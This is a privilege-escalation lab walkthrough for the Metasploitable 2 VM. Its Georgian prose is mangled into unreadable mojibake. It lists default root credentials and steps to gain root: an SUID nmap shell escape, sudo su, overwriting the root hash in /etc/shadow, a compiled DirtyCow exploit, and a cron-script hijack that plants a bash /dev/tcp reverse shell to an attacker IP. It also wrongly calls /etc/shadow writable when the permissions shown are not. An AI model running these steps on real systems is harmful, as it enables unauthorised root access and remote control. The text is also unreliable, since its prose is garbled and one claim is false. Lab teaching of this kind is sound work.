ğŸ§ª Privilege Escalation Lab â€“ Metasploitable 2
0. áƒ¨áƒ”áƒ¡áƒ•áƒšáƒ VM-áƒ¨áƒ˜

Metasploitable 2-áƒ¨áƒ˜ áƒ¨áƒ”áƒ¡áƒáƒ¡áƒ•áƒšáƒ”áƒšáƒáƒ“ áƒ’áƒáƒ›áƒáƒ˜áƒ§áƒ”áƒœáƒ”:

ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@<VM_IP>


ğŸ‘‰ áƒáƒáƒ áƒáƒšáƒ˜: msfadmin

áƒ—áƒ£ áƒ’áƒ˜áƒœáƒ“áƒ root-áƒ˜áƒ— áƒ¨áƒ”áƒ¡áƒ•áƒšáƒ:

ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa root@<VM_IP>


ğŸ‘‰ root áƒáƒáƒ áƒáƒšáƒ˜: msfadmin

1. áƒ¡áƒ˜áƒ¡áƒ¢áƒ”áƒ›áƒ˜áƒ¡ áƒ˜áƒœáƒ¤áƒáƒ áƒ›áƒáƒªáƒ˜áƒ˜áƒ¡ áƒ¨áƒ”áƒ’áƒ áƒáƒ•áƒ”áƒ‘áƒ
whoami
id
uname -a
cat /etc/issue


ğŸ“Œ Output (áƒ›áƒáƒ’áƒáƒšáƒ˜áƒ—áƒ˜):

msfadmin
uid=1000(msfadmin) gid=1000(msfadmin) groups=1000(msfadmin)
Linux metasploitable 2.6.24-16-server #1 SMP ... i686 GNU/Linux
Ubuntu 8.04


ğŸ‘‰ áƒ•áƒ®áƒ”áƒ“áƒáƒ•áƒ—, áƒ áƒáƒ› áƒ›áƒáƒ›áƒ®áƒ›áƒáƒ áƒ”áƒ‘áƒ”áƒšáƒ˜ msfadmin áƒáƒ áƒ˜áƒ¡ unprivileged áƒ“áƒ kernel áƒ«áƒ•áƒ”áƒšáƒ˜áƒ â†’ áƒ¨áƒ”áƒ¡áƒáƒ«áƒšáƒ”áƒ‘áƒ”áƒšáƒ˜áƒ exploit-áƒ”áƒ‘áƒ˜.

2. SUID áƒ‘áƒ˜áƒœáƒáƒ áƒ”áƒ‘áƒ˜áƒ¡ áƒ«áƒ”áƒ‘áƒœáƒ
find / -perm -4000 -type f 2>/dev/null


ğŸ“Œ áƒ›áƒáƒ’áƒáƒšáƒ˜áƒ—áƒáƒ“ áƒáƒ›áƒáƒáƒ’áƒ“áƒ”áƒ‘áƒ¡:

/usr/bin/passwd
/usr/bin/sudo
/usr/local/bin/nmap


ğŸ‘‰ nmap áƒ«áƒ•áƒ”áƒšáƒ˜ áƒ•áƒ”áƒ áƒ¡áƒ˜áƒ áƒ¨áƒ”áƒ˜áƒ«áƒšáƒ”áƒ‘áƒ interactive shell-áƒ¡ áƒ˜áƒ«áƒšáƒ”áƒáƒ“áƒ”áƒ¡ root-áƒ˜áƒ—.

3. Exploit SUID Nmap

áƒ’áƒáƒ£áƒ¨áƒ•áƒ˜:

nmap --interactive


ğŸ“Œ prompt:

nmap>


áƒ¨áƒ”áƒ›áƒ“áƒ”áƒ’:

!sh


ğŸ“Œ Output:

# whoami
root


ğŸ‘‰ áƒáƒ®áƒšáƒ root áƒáƒ áƒ˜áƒ•áƒ˜áƒšáƒ”áƒ’áƒ˜áƒ áƒ’áƒ•áƒáƒ¥áƒ•áƒ¡.

4. Sudo Misconfiguration

áƒ¨áƒ”áƒ›áƒáƒ¬áƒ›áƒ”áƒ‘áƒ:

sudo -l


ğŸ“Œ áƒ—áƒ£ áƒáƒ©áƒ•áƒ”áƒœáƒ”áƒ‘áƒ¡:

(ALL) NOPASSWD: ALL


ğŸ‘‰ áƒœáƒ˜áƒ¨áƒœáƒáƒ•áƒ¡, áƒ áƒáƒ› sudo-áƒ¡ root áƒáƒ áƒ˜áƒ•áƒ˜áƒšáƒ”áƒ’áƒ˜áƒ”áƒ‘áƒ˜ áƒ’áƒ•áƒáƒ¥áƒ•áƒ¡ áƒáƒáƒ áƒáƒšáƒ˜áƒ¡ áƒ’áƒáƒ áƒ”áƒ¨áƒ”.

áƒ’áƒáƒ£áƒ¨áƒ•áƒ˜:

sudo su
whoami


ğŸ“Œ Output:

root

5. Writable /etc/shadow

áƒ¨áƒ”áƒ›áƒáƒ¬áƒ›áƒ”áƒ‘áƒ:

ls -l /etc/shadow


ğŸ“Œ áƒ—áƒ£ output áƒ˜áƒ¥áƒœáƒ”áƒ‘áƒ:

- rw-r--r-- 1 root shadow ...


ğŸ‘‰ áƒœáƒ˜áƒ¨áƒœáƒáƒ•áƒ¡, áƒ áƒáƒ› áƒ¤áƒáƒ˜áƒšáƒ˜ world-readable/ writableáƒ â†’ áƒ¨áƒ”áƒ˜áƒ«áƒšáƒ”áƒ‘áƒ áƒáƒáƒ áƒáƒšáƒ˜ áƒ¨áƒ”áƒ•áƒªáƒ•áƒáƒšáƒáƒ—.

áƒ›áƒáƒ’áƒáƒšáƒ˜áƒ—áƒáƒ“ áƒáƒ®áƒáƒšáƒ˜ root áƒ°áƒ”áƒ¨áƒ˜áƒ¡ áƒ’áƒ”áƒœáƒ”áƒ áƒáƒªáƒ˜áƒ Kali-áƒ–áƒ”:

openssl passwd -1 mypassword


áƒ¨áƒ”áƒ›áƒ“áƒ”áƒ’ áƒ©áƒáƒ¡áƒ•áƒ˜ /etc/shadow-áƒ¨áƒ˜ root-áƒ˜áƒ¡ áƒ°áƒ”áƒ¨áƒ˜áƒ¡ áƒ›áƒáƒ’áƒ˜áƒ•áƒ áƒáƒ“.

6. Kernel Exploit (DirtyCow)

Kernel 2.6.24 áƒ“áƒáƒ£áƒªáƒ•áƒ”áƒšáƒ˜áƒ DirtyCow-áƒ–áƒ”.
Metasploit-áƒ¨áƒ˜ exploit áƒáƒ áƒ˜áƒ¡ linux/local/dirty_cow.

Linux VM-áƒ–áƒ” áƒáƒ˜áƒ áƒ“áƒáƒáƒ˜áƒ :

gcc -pthread dirty.c -o dirty -lcrypt
./dirty


ğŸ“Œ Output:

[*] Backing up /usr/bin/passwd..
[*] Pwned! Enjoy your new root shell
# whoami
root

7. PATH Hijacking

áƒ¨áƒ”áƒáƒ›áƒáƒ¬áƒ›áƒ” cron jobs:

cat /etc/crontab


áƒ—áƒ£ áƒ®áƒ”áƒ“áƒáƒ• áƒ¡áƒ™áƒ áƒ˜áƒáƒ¢áƒ¡, áƒ áƒáƒ›áƒ”áƒšáƒ˜áƒª root-áƒ˜áƒ— áƒ§áƒáƒ•áƒ”áƒš áƒ¬áƒ£áƒ—áƒ¨áƒ˜ áƒ›áƒ£áƒ¨áƒáƒáƒ‘áƒ¡ (áƒ›áƒáƒ’. /usr/local/bin/backup.sh), áƒ“áƒ áƒ˜áƒ¡ world-writableáƒ:

ls -l /usr/local/bin/backup.sh


ğŸ‘‰ áƒ¨áƒ”áƒªáƒ•áƒáƒšáƒ” áƒ¡áƒ™áƒ áƒ˜áƒáƒ¢áƒ˜:

echo "/bin/bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1" > /usr/local/bin/backup.sh


áƒ¨áƒ”áƒ›áƒ“áƒ”áƒ’ áƒ áƒáƒªáƒ cron áƒ’áƒáƒ”áƒ¨áƒ•áƒ”áƒ‘áƒ â†’ root reverse shell.
